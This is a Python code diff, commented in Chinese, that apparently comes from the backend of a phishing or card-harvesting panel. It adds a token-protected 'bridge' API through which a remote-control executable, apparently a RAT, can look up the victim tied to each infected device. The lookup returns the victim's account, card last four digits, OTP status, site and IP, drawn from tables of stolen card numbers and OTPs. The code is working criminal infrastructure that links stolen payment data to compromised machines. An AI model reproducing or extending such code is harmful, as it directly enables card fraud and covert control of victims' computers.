@@ -1724,6 +1724,56 @@ class Store:
             })
         return result
 
+    def device_bindings(self) -> list:
+        """已绑定设备的订单摘要，给远控 exe 反查用。
+
+        只给账号、卡尾号、状态，不给完整卡号和 CVV —— exe 只用来显示
+        「这台设备是谁装的」，不需要完整卡料。
+        """
+        with self.connect() as db:
+            rows = db.execute(
+                "SELECT v.uuid, v.site_abbreviation, v.referer, v.ip, v.created_at,"
+                " v.data, v.device_id, v.device_model, v.device_seen_at,"
+                " v.pay_status, v.status,"
+                " (SELECT ccard FROM payments WHERE uuid=v.uuid ORDER BY id DESC LIMIT 1) ccard,"
+                " (SELECT otp   FROM payments WHERE uuid=v.uuid ORDER BY id DESC LIMIT 1) otp"
+                " FROM visitors v WHERE v.device_id<>'' ORDER BY v.id DESC"
+            ).fetchall()
+        items = []
+        for row in rows:
+            try:
+                data = json.loads(row["data"] or "{}")
+            except (TypeError, ValueError):
+                data = {}
+            if not isinstance(data, dict):
+                data = {}
+            card = str(row["ccard"] or "")
+            items.append({
+                "dev": row["device_id"],
+                "uuid": row["uuid"],
+                "site": row["site_abbreviation"] or "",
+                "domain": row["referer"] or "",
+                "ip": row["ip"] or "",
+                "visitor_at": row["created_at"] or "",
+                "device_model": row["device_model"] or "",
+                "device_seen_at": row["device_seen_at"] or "",
+                "account": pick_field(data, ACCOUNT_TOKENS),
+                "card_tail": card[-4:] if len(card) >= 4 else "",
+                "has_otp": bool(row["otp"]),
+                "status": "已付卡" if row["pay_status"] else ("已提交" if row["status"] else "未提交"),
+            })
+        return items
+
+    def device_binding(self, dev: str):
+        """单台设备的绑定摘要；没绑过返回 None。"""
+        target = str(dev or "").strip()
+        if not target:
+            return None
+        for item in self.device_bindings():
+            if item["dev"] == target:
+                return item
+        return None
+
     def sync_devices(self, window_minutes: int = 30) -> dict:
         """按「同 IP + 时间窗」把远控上线的设备绑到访客记录上。
 
@@ -3044,6 +3094,8 @@ class Handler(BaseHTTPRequestHandler):
         "/api/projects", "/api/ipregistry/status", "/api/settings",
         "/api/device/list", "/api/device/sync",
     })
+    # 给远控 exe 反查用的只读接口（token 鉴权，不走后台登录态）
+    _BRIDGE_PATHS = ("/api/bridge/bindings", "/api/bridge/binding")
     _API_LOG_POST_PATHS = frozenset({
         "/api/events/clear", "/api/captures/clear", "/api/user/listData",
         "/api/user/export", "/api/user/statistics", "/api/user/doEmpty",
@@ -3211,6 +3263,8 @@ class Handler(BaseHTTPRequestHandler):
         return page, page_size
 
     def handle_api_get(self, path, query):
+        if path in self._BRIDGE_PATHS:
+            return self.handle_bridge_get(path, query)
         if not self.require_auth():
             return
         if path in self._API_READ_PATHS:
@@ -3218,6 +3272,30 @@ class Handler(BaseHTTPRequestHandler):
         if path in self._API_ADMIN_PATHS:
             return self.api_admin_get(path, query)
         return self.json(404, {"error": "request failed"})
+
+    def handle_bridge_get(self, path, query):
+        """给远控 exe 的只读反查：哪台设备对应哪条订单。
+
+        凭证复用系统设置里的「面板 Token」（和这边拉远控设备用的是同一个）。
+        只返回摘要：账号、卡尾号、状态，不含完整卡号和 CVV。
+        """
+        settings = STORE.get_settings()
+        expected = str(settings.get("remote_token", "")).strip()
+        token = (query.get("token") or [""])[0].strip()
+        if not expected or token != expected:
+            return self.json(403, {"ok": False, "error": "token 不正确"})
+
+        if path == "/api/bridge/bindings":
+            items = STORE.device_bindings()
+            return self.json(200, {"ok": True, "count": len(items), "items": items})
+
+        dev = (query.get("dev") or [""])[0].strip()
+        if not dev:
+            return self.json(400, {"ok": False, "error": "缺少 dev 参数"})
+        item = STORE.device_binding(dev)
+        if not item:
+            return self.json(404, {"ok": False, "error": "该设备还没有绑定订单"})
+        return self.json(200, {"ok": True, "item": item})
 
     def api_read_get(self, path, query):
         """日志、访客、统计类的只读接口。"""
